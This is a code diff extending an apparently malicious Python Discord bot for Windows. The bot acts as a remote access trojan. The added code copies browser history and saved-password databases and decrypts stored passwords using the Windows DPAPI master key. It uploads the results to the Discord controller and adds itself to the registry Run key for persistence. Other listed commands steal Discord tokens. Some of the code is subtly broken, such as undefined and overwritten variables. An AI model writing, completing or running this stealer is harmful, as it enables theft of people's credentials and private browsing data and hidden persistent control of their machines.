@@ -1,6 +1,7 @@
-import os, discord, subprocess, requests, re, json, sys, win32crypt, base64
+import os, discord, subprocess, requests, re, json, sys, win32crypt, base64, shutil, sqlite3, dhooks, psutil, winreg
 from Crypto.Cipher import AES
 from PIL import ImageGrab
+from datetime import datetime
 
 APPDATA = os.getenv("APPDATA")
 LOCALAPPDATA = os.getenv("LOCALAPPDATA")
@@ -45,6 +46,7 @@ commands = "\n".join([
     "tokens - Get all discord tokens",
     "passwords - Extracts all browser passwords",
     "history - Extracts all browser history",
+    "startup <name> - Add to startup",
 ])
 
 @bot.event
@@ -179,10 +181,90 @@ async def on_message(message):
         await message.reply(embed=embed)
                             
     if message.content == "history":
-        await message.reply("Not implemented yet")
+        paths = []
+        file = open(f"{TEMP}\\history.txt", "w")
+        for file, folder, files in os.walk(APPDATA):
+            if "History" in files:
+                paths.append(file) 
+        for file, folder, files in os.walk(LOCALAPPDATA):
+            if "History" in files:
+                paths.append(file) 
+        for path in paths:
+            if "History" not in os.listdir(path):
+                return
+            r_id = os.urandom(16).hex()
+            shutil.copy (f"{path}\\History", f"{TEMP}\\{r_id}.db")
+            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
+            cursor = connection.cursor()
+            cursor.execute("SELECT url, title, last_visit_time FROM urls")
+            for col in cursor.fetchall():
+                url = col[0]
+                title = col[1]
+                last_visit_time = col[2]
+                f.write(f"{url} - {title} - {datetime.fromtimestamp(last_visit_time/1000000-11644473600).strftime('%Y-%m-%d %H:%M:%S')}\n")
+            connection.close()
+        file.close()
+        embed = discord.Embed(title="History", description="```See attachment```", color=0xfafafa)
+        file = discord.File(f"{TEMP}\\history.txt")
+        await message.reply(embed=embed, file=file)
         
     if message.content == "passwords":
-        await message.reply("Not implemented yet")
+        paths = []
+        file = open(f"{TEMP}\\passwords.txt", "w")
+        for file, folder, files in os.walk(APPDATA):
+            if "Login Data" in files:
+                paths.append(file) 
+                
+        for file, folder, files in os.walk(LOCALAPPDATA):
+            if "Login Data" in files:
+                paths.append(file)
+        for path in paths:
+            if "Login Data" not in os.listdir(path):
+                return
+            r_id = os.urandom(16).hex()
+            try:
+                local_state = open(f"{path}\\Local State", "r")
+            except:
+                try: local_state = open(f"{path}\\..\\Local State", "r")
+                except: return
+            encrypted_master_key = base64.b64decode(json.loads(local_state.read())["os_crypt"]["encrypted_key"])
+            master_key = win32crypt.CryptUnprotectData(encrypted_master_key[5:], None, None, None, 0)[1]
+            shutil.copy (f"{path}\\Login Data", f"{TEMP}\\{r_id}.db")
+            connection = sqlite3.connect(f"{TEMP}\\{r_id}.db")
+            cursor = connection.cursor()
+            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+            for col in cursor.fetchall():
+                url = col[0]
+                username = col[1]
+                try:
+                    password = AES.new(master_key, AES.MODE_GCM, col[2][3:15]).decrypt(col[2][15:])[:-16].decode()
+                except:
+                    try:
+                        password = win32crypt.CryptUnprotectData(col[2], None, None, None, 0)[1].decode()
+                    except:
+                        password = "Decryption failed"
+                if password == "":
+                    password = "Decryption failed"
+
+                file.write(f"{url} - {username} - {password}\n")
+            connection.close()
+        file.close()
+        embed = discord.Embed(title="Passwords", description="```See attachment```", color=0xfafafa)
+        file = discord.File(f"{TEMP}\\passwords.txt")
+        await message.reply(embed=embed, file=file)
+        
+    if message.startswith("startup"):
+        name = message.content[8:]
+        if not name:
+            embed = discord.Embed(title="Error", description="```No name provided```", color=0xfafafa)
+            await message.reply(embed=embed)
+        else:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, os.path.realpath(__file__))
+            winreg.CloseKey(registry_key)
+            embed = discord.Embed(title="Startup", description=f"```Added to startup as {name}```", color=0xfafafa)
+            await message.reply(embed=embed)
 
 bot.run(token)
 
